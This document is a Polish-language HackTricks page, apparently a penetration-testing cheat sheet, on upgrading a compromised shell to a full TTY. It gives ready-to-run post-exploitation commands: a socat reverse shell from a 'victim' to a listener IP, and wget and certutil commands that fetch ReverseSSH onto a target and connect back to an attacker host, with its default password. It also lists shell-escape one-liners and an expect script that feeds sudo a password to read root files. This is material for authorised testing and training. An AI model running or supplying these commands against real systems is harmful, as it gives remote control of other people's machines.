# Pełne TTY

{{#include ../../banners/hacktricks-training.md}}

## Pełne TTY

`/etc/shells` zawiera ścieżki dozwolonych powłok logowania i jest sprawdzany przez niektóre programy; nie jest uniwersalnym warunkiem wstępnym przydzielenia PTY.<sup>[[3]](#references)[[4]](#references)</sup> Jeśli program taki jak `pkexec` odrzuca `SHELL`, wyświetlając komunikat `The value for the SHELL variable was not found in the /etc/shells file`, upewnij się, że dokładna ścieżka powłoki, na przykład `/bin/bash`, znajduje się w pliku `/etc/shells`.<sup>[[10]](#references)</sup> Poniższa sekwencja odzyskiwania `CTRL+Z`/`fg` korzysta z kontroli zadań Bash; jeśli bieżąca powłoka nie jest Bashem, uruchom Bash przed użyciem tej sekwencji.<sup>[[7]](#references)</sup>

#### Python

`pty.spawn` języka Python uruchamia program połączony ze standardowymi strumieniami wejścia, wyjścia i błędów bieżącego procesu, dzięki czemu Bash otrzymuje pseudoterminal w tej sesji.<sup>[[4]](#references)</sup>
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
> [!TIP]
> Możesz uzyskać **liczbę** **wierszy** i **kolumn**, uruchamiając **`stty -a`**; `-a` wyświetla wszystkie bieżące ustawienia terminala. Dane wyjściowe polecenia są specyficzne dla terminala, dlatego użyj wartości zgłoszonych przez bieżącą sesję.<sup>[[11]](#references)</sup>

#### script

Narzędzie `script` rejestruje sesję terminala; tutaj `/dev/null` odrzuca typescript, `-q` wycisza komunikaty rozpoczęcia i zakończenia, a `-c` uruchamia Bash zamiast domyślnej powłoki.<sup>[[5]](#references)</sup>
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
```
Po zastosowaniu dowolnej metody PTY-spawn zawieś sesję Netcat i przywróć ją z lokalnym trybem raw, a następnie ustaw zdalne środowisko terminala i jego wymiary:
```bash
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat

Listener używa bieżącego terminala w trybie raw z wyłączonym lokalnym echem i akceptuje połączenia TCP na porcie 4444. Polecenie na victimie alokuje pty, łączy stderr, tworzy sesję, przekazuje SIGINT i stosuje sane terminal settings; dodaj `ctty`, jeśli proces potomny potrzebuje controlling terminal.<sup>[[6]](#references)</sup>
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap (stare wersje z `--interactive`): `!sh`

Ucieczka Nmap jest zależna od wersji: Nmap usunął tryb `--interactive` w późniejszych wydaniach, więc `!sh` działa tylko w starszych wersjach.<sup>[[13]](#references)</sup>

## ReverseSSH

Wygodnym sposobem na **interaktywny dostęp do shella**, a także **transfer plików** i **przekierowanie portów**, jest umieszczenie na celu statycznie linkowanego serwera ssh [ReverseSSH](https://github.com/Fahrj/reverse-ssh).<sup>[[1]](#references)</sup>

Poniżej znajduje się przykład dla `x86` z opublikowanym przez projekt binarium skompresowanym za pomocą UPX. W przypadku innych architektur lub artefaktów wydań użyj [strony wydań](https://github.com/Fahrj/reverse-ssh/releases/latest/) jako punktu odniesienia.<sup>[[1]](#references)</sup>

1. Przygotuj lokalny host do odebrania przychodzącego połączenia SSH. W trybie listenera opcja `-l` włącza listener, a `-p 4444` wybiera port, na którym akceptowane jest połączenie celu.<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Cel Linux. Przenieś ten sam artefakt `upx_reverse-sshx86` do `/dev/shm/reverse-ssh` i nadaj mu uprawnienia do wykonywania. Opcja celu `-p 4444` wybiera port listenera podany powyżej, a `kali@10.0.0.2` określa konto i host używane do nawiązania połączenia zwrotnego.<sup>[[1]](#references)</sup>
```bash
/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) Cel Windows. Pełny interaktywny PowerShell wymaga Windows 10 w kompilacji 17763; zobacz [README projektu](https://github.com/Fahrj/reverse-ssh#features).<sup>[[1]](#references)</sup>
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
Przykład dla Windows używa `certutil` z opcjami `-f -urlcache`; Microsoft opisuje `-f` jako wymuszenie pobrania URL i zaznacza, że dostępne parametry różnią się w zależności od wersji, dlatego jeśli ta forma jest niedostępna, sprawdź `certutil -?`.<sup>[[12]](#references)</sup>

- Po pomyślnym nawiązaniu połączenia zwrotnego listener ReverseSSH w trybie reverse domyślnie nasłuchuje na porcie `8888` (lub na wartości podanej za pomocą `-b`), a połączenia przychodzące akceptują dowolną nazwę użytkownika z domyślnym hasłem `letmeinbrudipls`. Zdalna powłoka działa z uprawnieniami konta, które uruchomiło `reverse-ssh(.exe)`.<sup>[[1]](#references)</sup>
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) automatycznie podnosi poziom Unix-like reverse shells do PTY, zmienia rozmiar Unix-like terminals i rejestruje interakcje z shell; w przypadku Windows shells zapewnia readline, ale nie oferuje zmiany rozmiaru terminala w czasie rzeczywistym.<sup>[[2]](#references)</sup>

Uruchom `penelope`, aby domyślnie nasłuchiwał na `0.0.0.0:4444`; przychodzące Unix-like shells mogą być wtedy automatycznie podnoszone do PTY i rejestrowane.<sup>[[2]](#references)</sup>

![Penelope obsługujący i podnoszący poziom przychodzącego shell](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Bez TTY

Jeśli z jakiegoś powodu nie możesz uzyskać pełnego TTY, **nadal możesz wchodzić w interakcję z programami**, które oczekują danych wejściowych użytkownika. W poniższym przykładzie Expect uruchamia `sudo`, czeka na monit o hasło, wysyła hasło i zwraca kontrolę za pomocą `interact`; `sudo -S` odczytuje hasło ze standardowego wejścia. Używaj tego wyłącznie w autoryzowanym labie i unikaj umieszczania prawdziwych danych uwierzytelniających w historii shell lub plikach źródłowych.<sup>[[8]](#references)[[9]](#references)</sup>
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## References

- [1] [ReverseSSH - statycznie linkowany serwer ssh z funkcją reverse shell dla CTF-ów i podobnych zastosowań](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - handler Shell, który automatyzuje kilka czynności, aby ułatwić pracę](https://github.com/brightio/penelope)
- [3] [shells(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/shells.5.html)
- [4] [Python `pty` — dokumentacja Python](https://docs.python.org/3/library/pty.html)
- [5] [script(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/script.1.html)
- [6] [socat(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/socat.1.html)
- [7] [Podręcznik referencyjny Bash — kontrola zadań](https://www.gnu.org/s/bash/manual/bash.html)
- [8] [sudo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [9] [expect(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/expect.1.html)
- [10] [pkexec.c](https://github.com/polkit-org/polkit/blob/main/src/programs/pkexec.c)
- [11] [stty(1) — strona podręcznika Linux](https://man7.org/linux/man-pages/man1/stty.1.html)
- [12] [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Dziennik zmian Nmap](https://nmap.org/changelog.html)
{{#include ../../banners/hacktricks-training.md}}
